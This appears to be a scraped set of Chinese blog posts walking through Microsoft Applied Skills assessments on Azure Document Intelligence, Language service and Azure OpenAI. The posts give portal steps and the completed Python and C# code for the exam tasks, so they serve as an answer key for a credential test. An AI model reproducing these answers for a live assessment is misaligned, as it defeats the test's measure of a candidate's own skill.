预览没有问题后，直接点击创建按钮。创建完毕后，在页面中点击 Go to resource 按钮 之后点击 Go to Document Intelligence Studio 按钮 进入到服务页面后，下滑页面，点击 Invoices 的 Try it out。 （如果弹出选择账户的弹框，点击一个就好） 在服务的填写表格页面，默认的订阅和资源组选择下拉按钮 预览后点击完成按钮。 在上述步骤完成后，点击左侧的上传区域，点击选择文件按钮，在新弹出的选择文件筐，找到 C:\\Files的文件，之后选择发票pdf 选择玩文件后，点击 Analyze options 选项，之后选择 all documents，之后点击保存按钮。 配置完分析选项后，点击直接点击运行分析按钮。 运行完后，找到右侧的 Result按钮，之后下载下来我们所需要的 JSON 文件。 刚上传的三个文件，分析完三个都下载下来。 之后我们重复操作，将所有的图片文件上传。 同样的点击分析按钮。下载下来结果JSON文件。 最后我们可以看到下载的结果文件如下图这几个在 Downloads 文件夹中（在在这里我们需要复制这些文件 复制上述的文件后粘贴在下图路径的文件夹中。 c:&#x2F;files 接着我们返回 RG1 的这个资源组（进入步骤在本篇文档开头的位置……），选择 prototype 开头的资源，点击进入 之后我们展开 Data storage 进入到存储服务中选择 Containers 之后我们创建一个新的 Container，这里直接使用名字：con-invoices。 同样操作再次创建另一个 Containers，名字叫做：con-receipts。 可以看到我这里创建了两个 Containers，一个存pdf的一个存图片的 分别点击两个名字，之后我们开始上传 把所有的 Invoice 相关文件上传 另外一个将所有的 receipt 文件上传。到这里我们的第一个任务就完成了。 试验二：Train a custom model在实验二中，我们需要创建一个智能文档分析服务，并且进行相关的训练。首先我们进入 https://documentintelligence.ai.azure.com/studio 页面选择服务：Custom extraction model。 下拉页面，之后点击项目选项中的 创建一个项目按钮，在新页面，输入项目名点击继续按钮。 在详细页面，订阅以及资源组选项选择默认，智能文档名字要选择我们的题目要求form开头的， API选择：2022-08-31 这里注意除了订阅和资源组选项默认外，我们的存储账号要选择quality开头的这个，这里不要选错。 上述完成后点击预览创建按钮。 等待一会后，在弹出的页面直接点击 Run now 按钮 如果出现 failed to fetch 刷新一下当前的页面 在新页面中，选择一个jpg文件后，点击右侧的添加字段选项 这里根据我们的题目，需要添加如下的几个字段Email里（第一列是字段，第二列是对应的类型） 可以看到我在右侧已经根据题目创建了这5个字段 这里是介绍如何进行选择字段的数据类型*，比如Number字段，要选择 integer 类型。依次把五个标签名都设置好数据类型。 之后我们点击图片的 Number数字，也就是下图的绿色部分的数字，之后点鼠标左键，选择我们刚才创建的 Number 字段 同样的我们把所有的字段都在图片中选择打上标签 重复操作所有的图片文件，将字段标记清楚，之后点击训练按钮. 这里选择训练模型，直接写上 QA-Template，如下图所示。Build Mode 选择 Template 点击 Go to Models 可以看到我们这里已经创建了训练，点击QA-Template 我们进行测试，直接点击 Test 按钮。 选择电脑中的 C盘下 QA_Test 文件夹内的文件。 点击运行分析按钮 在这里我们需要注意，所有的都分析完后，我们要下载 report0008.jpg的结果，讲这个 JSON文件下载下来。 结果保存下来。存到QA_Test打开VSCode &gt;&gt; 点击 Open Folder 按钮。接下来打开 C 盘下的 App1 文件夹 之后打开Python 文件夹下 App1.py 文件。更改的代码： （！！！格式缩进要！！！注！！！意！！！） 12345678#9task = form_recognizer_client.begin_recognize_invoices(form_data)#21if field.confidence &gt;= 0.70: invoice_total += field.value#37folder_path = r&quot;C:\\App1\\Invoices&quot; 之后在 python 目录下的.env文件内，添加自己的创建服务的 endpoint 和 key 值。ctrl S 保存文件 ps：Key 和 endpoint 进入https://portal.azure.com/ ，选择刚刚创建的资源 页面切回 App1.py 这个文件 直接点击右上角三角运行 运行看结果，已经分析出来了 最后实验完成，点击提交实验等待结果即可。 End","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"AzureAI","slug":"AzureAI","permalink":"https://banjinmei.github.io/tags/AzureAI/"}],"author":"mu"},{"title":"Azure OpenAI Build Natural Language","slug":"Azure-OpenAI-Build-Natural-Language","date":"2024-06-06T17:03:12.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/07/Azure-OpenAI-Build-Natural-Language/","permalink":"https://banjinmei.github.io/2024/06/07/Azure-OpenAI-Build-Natural-Language/","excerpt":"","text":"https://learn.microsoft.com/en-us/credentials/applied-skills/build-natural-language-solution-azure-ai/#applied-skill-take-the-assessment?ocid=reactor start 进入环境中，点击Step 1，然后点击Password右边的T，登录环境 双击打开桌面的Email文件对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，proof of concept、Invoice validation、chatbot backend 分别表示的是本次考试的三大任务的具体要求将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录 试验一： Proof of Concept (POC)点击邮件中的 Proof of Concept (POC) 菜单会出现具体的内容要求，如下图所示。 在第一个实验中主要是使用微软的 language 服务，并且创建的时候要符合要求，这个服务要满足客户自定义文本标准和 NER。在实验中另外一个要求是需要使用代码最后调用这个你创建服务。流程操作首先在登录主页面搜索栏 搜索RG1，并点击Resource Groups下面的RG1进入后点击 Create 按钮 之后在首页内搜索language service 点击进入到 Language service 后，点击 Create之后点击右下方的第二个 select 按钮选择好之后，点击下方的按钮 continue to create your resource 在配置页面，按照我们的题目要求，在 Region 中选择 North Europe，其中 Name 从邮件中找，在 Proof of concept 这里 lang开头的这个名字，作为刚才创建资源的 Name 值 主要需要注意的是在 Pricing tier层里，需要选择 Free F0 的这个，这一点也是题目要求的。下面选择 Existing storege account ，在存储账户这里，需要选择题目要求的以sa开头的这个账户。 这些配置都没问题后，直接点击蓝色的 Review + create 按钮。进入到审核页面，这个页面没有问题后，点击蓝色的 Create 按钮。 等待若干分钟，出现如下画面表示服务创建完成，点击 Go to resource group点击 进入 lang 开头的这个服务 在创建完成服务后，进入到服务页面，找到下面如图所示的链接: Click here to manage keys 这里面有所需要的 key和 endpoint 等。 在这个页面可以看到有两个比较东西是我们在代码中需要的，一个是 key 一个是 endpoint。在后面我们试验一和试验三要用到。 打开电脑 C:\\PoC\\Csharp文件夹下的 program.cs 将我们的 key 和 endpoint 替换为我们上一步骤中的值。 123456789101112131415161718192021222324252627282930313233343536373839using Azure;using System;using Azure.AI.TextAnalytics;namespace ProofOfConcept&#123; class Program &#123; private static readonly AzureKeyCredential credentials = new AzureKeyCredential(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly Uri endpoint = new Uri(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); static void RecognizeYourText(TextAnalyticsClient client) &#123; string document = &quot;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.&quot;; var entities = client.null; // replace null with the correct method to recognize the requested information.a Console.WriteLine($ &quot;Redacted Text: &#123;entities.RedactedText&#125;&quot;); if(entities.Count &gt; 0) &#123; Console.WriteLine($ &quot;Recognized &#123;entities.Count&#125; the following entities &#123;(entities.Count &gt; 1 ? &quot; ies &quot; : &quot; y &quot;)&#125;:&quot;); foreach(var entity in entities) &#123; Console.WriteLine($ &quot;Text: &#123;entity.Text&#125;, Category: &#123;entity.Category&#125;, SubCategory: &#123;entity.SubCategory&#125;, Confidence score: &#123;entity.ConfidenceScore&#125;&quot;); &#125; &#125; else &#123; Console.WriteLine(&quot;No entities were found.&quot;); &#125; &#125; static void Main(string[] args) &#123; var client = new TextAnalyticsClient(endpoint, credentials); RecognizeYourText(client); Console.Write(&quot;Press any key to exit.&quot;); Console.ReadKey(); &#125; &#125;&#125; 进入到cmd中后，build run ~ ok Or 用python 打开电脑 C:\\PoC\\Python 文件夹下的 App1.py key 和 endpoint 替换 1234567891011121314151617181920212223242526272829303132from azure.ai.textanalytics import TextAnalyticsClientfrom azure.core.credentials import AzureKeyCredential# Authenticate the client using your key and endpoint text_analytics_credential = AzureKeyCredential(key)text_analytics_client = TextAnalyticsClient( endpoint=endpoint, credential=text_analytics_credential)# Method for recognizing content in documents def recognize_your_text(client): documents = [ &quot;Call our office at 312-555-1234 and ask for Graham Barnes, or send an email to support@contoso.com.&quot; ] # Replace null with the correct method to recognize the requested information. response = client.recognize_entities(documents, language=&quot;en&quot;) result = [doc for doc in response if not doc.is_error] for doc in result: #print(&quot;Redacted Text: &#123;&#125;&quot;.format(doc.redacted_text)) for entity in doc.entities: print(&quot;Entity: &#123;&#125;&quot;.format(entity.text)) print(&quot;\\tCategory: &#123;&#125;&quot;.format(entity.category)) print(&quot;\\tConfidence Score: &#123;&#125;&quot;.format(entity.confidence_score)) print(&quot;\\tOffset: &#123;&#125;&quot;.format(entity.offset)) print(&quot;\\tLength: &#123;&#125;&quot;.format(entity.length))recognize_your_text(text_analytics_client) 目录的地址栏，输入cmd按下回车 1python App1.py ok 试验二：Invoice validation在第二个实验中主要使用了 NER 去抽取指定内容。这需要在 Azure 的语言服务中去部署一个 Language studio 服务。 流程操作接着返回我们刚才复制key和EndPoint那个语言服务的界面，点击左边栏的Overview，首先在我们的语言服务 lang-41073075 中找到 Language studio 服务并点击进入。 进入到服务中后，按照如图所示配置自己的 订阅、资源类型以及资源名字，这里都是点击下拉菜单进行选择。进入到该页面后，如果显示没有登录的状态，点击右上角的 Sign in，登录后进入到如下界面 选择已有的存在项，Resource type 这里选择 Language。选择好后，点击 Done配置好 Language Studio后，选择 Extraction information 下面的标签拉页面， 在这页面找到 Custom named entity recognition 服务，点击进入。在页面中点击创建新项目按钮。 类似于前面的操作，先配置订阅、资源、存储等信息如下图所示，点击 Next在基础信息部分，需要对设置名字，这里根据题目设置名字为：webshop，主语言选择 English（US）。在 Blob store container 选择名字 webshop，点击 Next点击 Create project 创建完毕后，我们需要创建entity，进入到 Data labeling 页面，点击右侧的 Add entity 按钮，根据题目，分别添加 Price 和 CustomerName，主页这里下图我只显示了添加方法，具体的 Price 和 CustomerName 要都添加出来。创建完 entity 后，依次点击这 10 个文件，给里面的文件内容打标签就要给数据打标签，先点击标签后面的笔形状的按钮，然后选择好对应的信息，Name 后面标记 CustomerName 的信息，Price 后面的信息标记 Price 标签。标记上就是和图片上的一样。每标记完一个，点击 next document，直到 10 个文件都标记好注意：这个步骤要讲所有的文档都打上标签。 完成上述所有标签后，点击菜单中的 Training jobs，点击 Start a training job。 为自己的训练模型取一个名字，例如 model-job-01 之后点击 Train 按钮。 点击按钮后的页面，到此步骤，页面在后台自己训练就好。实验2就完成了。 试验三：Chatbot backend在这个实验中主要是创建一个对话机器人，之后导入具体的模型后，使用代码进行对话操作。实验流程进入 https://language.cognitive.azure.com/home选择 Understand questions and conversational language中找到 Conversational language understanding 子服务。进入 进入到 Conversational language understanding 子服务后，点击 Import 按钮，选择C:\\project 文件夹下的 lang4567.json 文件，name 命名为 lang4567 ，点击 done 完成上面步骤后，点击 Training jobs 菜单。点击 Starting a training job在我们新建的训练任务重，选择训练模型，也就是我们上面创建的lang4567在这里数据切割选项需要注意，根据题目设置 85% 和 15%。 858585 直接点击 Train 按钮，进行训练 点击左边栏的 Deploying a model 后，点击Add deployment。等待模型训练完成 出现如下图标，我们进行部署 点击Add deployment。 在新页面选择创建一个新部署，名字和模型都设置为 lang4567，添加完成后，点击部署按钮。 等待模型部署完成 双击打开 C:\\CLU_PoC\\Csharp 文件夹下面的 .cs ，先要做的是类似第一个试验上面的替换key和endpoint，但是 projectName 和 deploymentName 分别是我们刚才设置的 lang4567。刚第一题的key 和 EndPoint 是一样的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283using Azure;using System;using System.Text.Json;using Azure.Core;using Azure.AI.Language.Conversations;namespace ProofOfConcept&#123; class Program &#123; private static readonly AzureKeyCredential credential = new AzureKeyCredential(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly Uri endpoint = new Uri(&quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;); private static readonly string projectName = &quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;; private static readonly string deploymentName = &quot;&#123;REPLACE-WITH-YOUR-VALUE&#125;&quot;; static void RecognizeYourText(string ? query) &#123; if(query == null || query.Length &gt; 1000) &#123; query = &quot;can you send me a few gizmos?&quot;; &#125; var data = new &#123; analysisInput = new &#123; conversationItem = new &#123; text = query, id = &quot;1&quot;, participantId = &quot;1&quot;, &#125; &#125;, parameters = new &#123; projectName, deploymentName, stringIndexType = &quot;Utf16CodeUnit&quot;, &#125;, kind = &quot;Conversation&quot;, &#125;; // Create client and send request var client = new null(endpoint, credential); // replace null with the correct method to recognize the requested information. Response response = client.null(RequestContent.Create(data)); // replace null with the correct method to recognize the requested information. if(response.ContentStream == null) &#123; Console.WriteLine(&quot;No response received.&quot;); return; &#125; using JsonDocument result = JsonDocument.Parse(response.ContentStream); JsonElement conversationalTaskResult = result.RootElement; JsonElement conversationPrediction = conversationalTaskResult.GetProperty(&quot;result&quot;).GetProperty(&quot;prediction&quot;); Console.WriteLine(&quot;Intents:&quot;); foreach(JsonElement intent in conversationPrediction.GetProperty(&quot;intents&quot;).EnumerateArray()) &#123; Console.WriteLine($ &quot;Category: &#123;intent.GetProperty(&quot; category &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Confidence: &#123;intent.GetProperty(&quot; confidenceScore &quot;).GetSingle()&#125;&quot;); Console.WriteLine(); &#125; Console.WriteLine(&quot;Entities:&quot;); foreach(JsonElement entity in conversationPrediction.GetProperty(&quot;entities&quot;).EnumerateArray()) &#123; Console.WriteLine($ &quot;Category: &#123;entity.GetProperty(&quot; category &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Text: &#123;entity.GetProperty(&quot; text &quot;).GetString()&#125;&quot;); Console.WriteLine($ &quot;Offset: &#123;entity.GetProperty(&quot; offset &quot;).GetInt32()&#125;&quot;); Console.WriteLine($ &quot;Length: &#123;entity.GetProperty(&quot; length &quot;).GetInt32()&#125;&quot;); Console.WriteLine($ &quot;Confidence: &#123;entity.GetProperty(&quot; confidenceScore &quot;).GetSingle()&#125;&quot;); Console.WriteLine(); &#125; &#125; static void Main(string[] args) &#123; string ? input = null; if(args.Length &gt; 0) &#123; input = System.IO.File.ReadAllText(args[0]); &#125; RecognizeYourText(input); Console.Write(&quot;Press any key to exit.&quot;); Console.ReadKey(); &#125; &#125;&#125; cmd build run , ok or双击打开 C:\\CLU_PoC\\Python 文件夹下面的 App1.py ，先要做的是类似第一个试验上面的替换key和endpoint，但是 project_name 和 deployment_name 分别是我们刚才设置的 lang4567。刚第一题的key 和 EndPoint 是一样的 修改完代码后，跟试题一同样的方法，在当前文件的文件夹地址栏输入 cmd ,在命令窗口输入python App1.py运行 App1 ，有如下信息后证明成功 完成3个步骤试验后，点击界面中的 Submit Assessment 按钮，弹出的确认页面后点击 Submit 按钮。 证书 End","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"Python","slug":"Python","permalink":"https://banjinmei.github.io/tags/Python/"},{"name":"Azure","slug":"Azure","permalink":"https://banjinmei.github.io/tags/Azure/"},{"name":"OpenAI","slug":"OpenAI","permalink":"https://banjinmei.github.io/tags/OpenAI/"}],"author":"mu"},{"title":"Azure AI Develop Generative AI solutions","slug":"Azure-OpenAI-sln","date":"2024-06-05T16:18:03.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/06/06/Azure-OpenAI-sln/","permalink":"https://banjinmei.github.io/2024/06/06/Azure-OpenAI-sln/","excerpt":"","text":"Starthttps://learn.microsoft.com/en-us/credentials/applied-skills/develop-generative-ai-solutions-with-azure-openai-service/#applied-skill-take-the-assessment 部署Azure OpenAI 服务​ 点击Step 1，然后点击Password右边的T​ 鼠标双击Email​对Inbox的内容进行逐个点击，其中Existing Environment包含了微软官方提供的Azure的用户名和密码，Validate proof of concept、Company chatbot、Developer tasks和Use company data分别表示的是本次考试的四大任务的具体要求 切换到Azure登录的标签页 ​将邮箱中Existing Environment的用户名和密码依次复制到Azure的标签页面中，并点击Sign in完成Azure的登录 然后在浏览器中输入URL：https://portal.azure.com/#home，点击Azure AI services ​其中Resource group、Pricing tier勾选下拉列表的存在项，Name可自行填入(如azureservice)，然后点击Next​ 网络中选择第一项：All networks，然后点击页面左下方的NextTags可直接点击左下方的Next然后在Review+submit页面点击Create​等待几十秒后，deployment完成后，点击Deployment details点击Resource中的名称，如azureservice​点击Endpoints右边的Click here to view endpoints​​ 点击Key 1右侧的复制按钮，复制其到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY变量中。点击Endpoint右侧的复制按钮，分别复制任意一个 KEY 和 EndPoint 到C:\\files\\AzureOpenAIPoc\\Python.env中的AZURE_OAI_KEY 和 AZURE_OAI_ENDPOINT。 然后在浏览器中输入https://portal.azure.com/#home，并点击Name下的名称 点击Go to Azure OpenAI Studio 然后点击Create new deployment 按照下图中的内容进行下拉选择或者填写，其中Select a model勾选为gpt-35-turbo-16k，Deployment name可自定义填写，如gpt_deploy，将Tokens per Minute Rate Limit设置为5K，Enable Dynamic Quota设置为Disabled，最后点击Create： 确保Status为Succeed，则说明部署成功了 将C:\\files\\AzureOpenAIPoc\\Python.env中AZURE_OAI_MODEL设置为Deployment name，如gpt_deploy AI Search相关操作然后在浏览器中输入https://portal.azure.com/#home，在输入框中输入ai search，点击AI Search点击Name下的名称 点击Import data 在Connect to your data中勾选Data Source为Azure Blob Storage 点击Name下的名称选择blob1，并点击Select 填入azure，并点击左下方的Next：Add cognitive skills： 在Add cognitive skills中点击Skip to: Customize target index 修改index name为pocindex，然后点击Next: Create an indexe 修改Indexer的Name为pocindex，然后点击Submit 复制其 url 作为C:\\files\\AzureOpenAIPoc\\Python.env中的值SEARCH_ENDPOINT 点击Essentials左边的箭头收起该部分内容，然后点击Properties，再点击API keys 然后点击Primary admin keys中的复制按钮，复制其到C:\\files\\AzureOpenAIPoc\\Python.env中的SEARCH_KEY变量中。修改其中SEARCH_INDEX为pocindex 修改后完整的.env内容如下所示，写改完后记得保存并关闭 修改PoC.py文件具体路径为：C:\\files\\AzureOpenAIPoc\\Python\\PoC.py。打开文件的方法可参考部署Azure OpenAI服务中的.env文件，唯一差别之处在于PoC.py可双击打开。需要说明的是：粘贴后记得按下ctrl+s进行保存 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200import osimport requestsfrom dotenv import load_dotenvimport utilsfrom openai import AzureOpenAIimport asynciofrom openai import AsyncAzureOpenAI# Add OpenAI import. (Add code here)def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(&quot;AZURE_OAI_ENDPOINT&quot;) azure_oai_key = os.getenv(&quot;AZURE_OAI_KEY&quot;) azure_oai_model = os.getenv(&quot;AZURE_OAI_MODEL&quot;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=&quot;2024-02-15-preview&quot; ) function_map = &#123; &quot;1&quot;: function1, &quot;2&quot;: function2, &quot;3&quot;: function3, &quot;4&quot;: function4 &#125; while True: print(&#x27;1: Validate PoC\\n&#x27; + &#x27;2: Company chatbot\\n&#x27; + &#x27;3: Developer tasks\\n&#x27; + &#x27;4: Use company data\\n&#x27; + &#x27;\\&#x27;quit\\&#x27; to exit the program\\n&#x27;) command = input(&#x27;Enter a number:&#x27;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == &#x27;quit&#x27;: print(&#x27;Exiting program...&#x27;) break else: print(&quot;Invalid input. Please enter number 1, 2, 3, 4, or 5.&quot;) except Exception as ex: print(ex)# Task 1: Validate PoCdef function1(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 1: Validate PoC&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;messages&quot;: messages, &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 2: Company chatbotdef function2(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 2: Company chatbot&quot;, &quot;sample-text.txt&quot;) messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant that responds in a casual tone. Each response should end with &#x27;Hope that helps! Thanks for using Contoso, Ltd.&#x27;&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is the best way to find if a company is hiring?&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;You can start by checking the company&#x27;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 3: Developer tasksdef function3(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 3: Developer tasks&quot;, &quot;sample-text.txt&quot;) # Define system message based on the task system_message = &quot;Take the legacy code in legacyCode.py, add comments and generate documentation.&quot; messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: system_message&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response # Task 4: Use company datadef function4(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 4: Use company data&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) search_endpoint = os.getenv(&quot;SEARCH_ENDPOINT&quot;) search_key = os.getenv(&quot;SEARCH_KEY&quot;) search_index = os.getenv(&quot;SEARCH_INDEX&quot;) # Perform the search query search_query = &#123; &quot;search&quot;: inputText, &quot;searchMode&quot;: &quot;any&quot;, &quot;queryType&quot;: &quot;simple&quot;, &quot;top&quot;: 5 # Adjust the number of results as needed &#125; headers = &#123; &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;api-key&quot;: search_key &#125; search_url = f&quot;&#123;search_endpoint&#125;/indexes/&#123;search_index&#125;/docs/search?api-version=2021-04-30-Preview&quot; response = requests.post(search_url, headers=headers, json=search_query) search_results = response.json() # Extract relevant search results search_snippets = [result[&quot;content&quot;] for result in search_results[&quot;value&quot;]] search_content = &quot;\\n\\n&quot;.join(search_snippets) # Build messages for OpenAI with search results included messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful travel agent.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: f&quot;&#123;inputText&#125;\\n\\nSearch Results:\\n&#123;search_content&#125;&quot;&#125; ] # Define connection and argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. Will be the same as function1 (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return# Call main function. Do not modify.if __name__ == &#x27;__main__&#x27;: main() 将上述修改后的代码复制到C:\\files\\AzureOpenAIPoc\\Python\\PoC.py中，打开文件方法较为简单，即通过鼠标双击也就是通过VScode工具打开该文件可使用ctrl+a删除全部内容，然后再通过ctrl+c和ctrl+v进行复制，接着按ctrl+s进行保存，最后在地址栏删除已有内容，并在其中输入cmd，并按下回车键 进入到cmd中后，输入python PoC.py，每输入完一个命令按回车代表执行该命令 然后可输入题号，比如 输入1 代表的是第一个题(Validate PoC)，然后可输入type或者file，其中type指的是自行输入prompt，而file是从目录下的sample-text.txt读取得到输入prompt。需要说明的是，可连续进行提问，不需要中间退出。 第一题第一题可依次输入type、who are you(或者其它prompt)进行提问或者直接输入file进行提问。查看结果是否正常输出。 第二题第二题可依次输入type、who are you来进行提问，或者依次输入type和其他问题。查看是否以Hope that helps!Thanks for using Contoso,Ltd.结尾。 然后再在第二题中输入type和Get the response in both English and Spanish: what is the best way to find if a company is hiring?(可直接ctrl+c、ctrl+v进行复制)进行提问 第三题第三题需要复制并运行文件两次，具体来说：第一次 是将c:\\files下的legacyCode.py复制到C:\\files\\AzureOpenAIPoc\\Python 路径下，首先删除文件夹中已有的sample-text.txt，并将legacyCode.py重命名为sample-text.txt(！！！注意是sample-text.txt，而不是sample-text.py)。然后运行python PoC.py，并输入3 和 file，查看结果是否产生了注释。 第二次需将PoC.py文件进行复制粘贴为以下内容，并按下ctrl+s进行保存 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202import osimport requestsfrom dotenv import load_dotenvimport utilsfrom openai import AzureOpenAIimport asynciofrom openai import AsyncAzureOpenAI# Add OpenAI import. (Add code here)def main(): try: load_dotenv() utils.initLogFile() azure_oai_endpoint = os.getenv(&quot;AZURE_OAI_ENDPOINT&quot;) azure_oai_key = os.getenv(&quot;AZURE_OAI_KEY&quot;) azure_oai_model = os.getenv(&quot;AZURE_OAI_MODEL&quot;) # Define Azure OpenAI client (Add code here)################## client = AzureOpenAI( azure_endpoint=azure_oai_endpoint, api_key=azure_oai_key, api_version=&quot;2024-02-15-preview&quot; ) function_map = &#123; &quot;1&quot;: function1, &quot;2&quot;: function2, &quot;3&quot;: function3, &quot;4&quot;: function4 &#125; while True: print(&#x27;1: Validate PoC\\n&#x27; + &#x27;2: Company chatbot\\n&#x27; + &#x27;3: Developer tasks\\n&#x27; + &#x27;4: Use company data\\n&#x27; + &#x27;\\&#x27;quit\\&#x27; to exit the program\\n&#x27;) command = input(&#x27;Enter a number:&#x27;) if command.strip() in function_map: function_map[command](client, azure_oai_model) elif command.strip().lower() == &#x27;quit&#x27;: print(&#x27;Exiting program...&#x27;) break else: print(&quot;Invalid input. Please enter number 1, 2, 3, 4, or 5.&quot;) except Exception as ex: print(ex)# Task 1: Validate PoCdef function1(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 1: Validate PoC&quot;, &quot;sample-text.txt&quot;) # Build messages to send to Azure OpenAI model. (Add code here) messages = [ &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;messages&quot;: messages, &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create( model=aiModel, messages=messages, temperature=0.7, max_tokens=800 ) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: &quot; + response.choices[0].message.content + &quot;\\n&quot;) return response# Task 2: Company chatbotdef function2(aiClient, aiModel): inputText = utils.getPromptInput(&quot;Task 2: Company chatbot&quot;, &quot;sample-text.txt&quot;) messages = [ &#123;&quot;role&quot;: &quot;system&quot;, &quot;content&quot;: &quot;You are a helpful assistant that responds in a casual tone. Each response should end with &#x27;Hope that helps! Thanks for using Contoso, Ltd.&#x27;&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;What is the best way to find if a company is hiring?&quot;&#125;, &#123;&quot;role&quot;: &quot;assistant&quot;, &quot;content&quot;: &quot;You can start by checking the company&#x27;s website, especially the careers section. Hope that helps! Thanks for using Contoso, Ltd.&quot;&#125;, &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: inputText&#125; ] # Define argument list (Add code here) apiParams = &#123; &quot;model&quot;: aiModel, &quot;messages&quot;: messages, &quot;max_tokens&quot;: 1000, &quot;temperature&quot;: 0.5 &#125; utils.writeLog(&quot;API Parameters:\\n&quot;, apiParams) # Call chat completion connection. (Add code here) # Use the call name and **apiParams to reference our argument list response = aiClient.chat.completions.create(**apiParams) utils.writeLog(&quot;Response:\\n&quot;, str(response)) print(&quot;Response: 